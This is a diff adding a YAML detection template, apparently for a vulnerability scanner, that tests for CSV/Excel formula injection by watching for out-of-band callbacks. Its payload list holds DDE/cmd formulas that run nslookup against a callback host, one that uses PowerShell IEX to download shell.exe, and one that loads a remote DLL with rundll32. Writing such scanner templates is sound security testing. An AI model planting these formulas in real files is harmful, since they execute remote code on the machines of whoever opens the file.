@@ -1,0 +1,20 @@
+id: excel-csv-injection
+issue_code: csv-injection
+detection_conditions: or
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 90
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+templates:
+  - DDE ("cmd";"/C nslookup {{.oob_address}}";"!A0")A0
+  - "@SUM(1+9)*cmd|' /C nslookup {{.oob_address}}'!A0"
+  - =10+20+cmd|' /C nslookup {{.oob_address}}'!A0
+  - =cmd|' /C nslookup {{.oob_address}}'!'A1'
+  - =cmd|'/C powershell IEX(wget {{.oob_address}}/shell.exe)'!A0
+  - =cmd|'/c rundll32.exe \\{{.oob_address}}\3\2\1.dll,0'!_xlbgnm.A1
+categories:
+  - oob
+  - injection
